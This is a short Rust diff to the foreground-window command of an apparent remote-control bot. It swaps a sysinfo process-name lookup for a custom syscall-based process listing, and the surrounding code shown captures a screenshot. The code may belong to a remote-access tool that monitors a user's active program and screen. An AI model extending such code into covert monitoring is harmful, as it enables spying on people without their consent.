@@ -50,14 +50,12 @@ impl BotCommand for ForegroundCommand {
             // process ID
             let mut process_id: DWORD = 0;
             GetWindowThreadProcessId(hwnd, &mut process_id);
-            // process name using sysinfo
-            let mut system = System::new_all();
-            system.refresh_all();
-            let process_name = if let Some(process) = system.process(Pid::from_u32(process_id)) {
-                process.name().to_string()
-            } else {
-                "Unknown".to_string()
-            };
+            
+            let process_name = crate::utils::syscall::get_process_list()
+                .into_iter()
+                .find(|(pid, _)| *pid == process_id)
+                .map(|(_, name)| name)
+                .unwrap_or_else(|| "Unknown".to_string());
             // screenshot
             let screenshot = screenshots::Screen::all().unwrap().first().unwrap().capture().unwrap();
             let png_data = screenshot.buffer().to_vec();
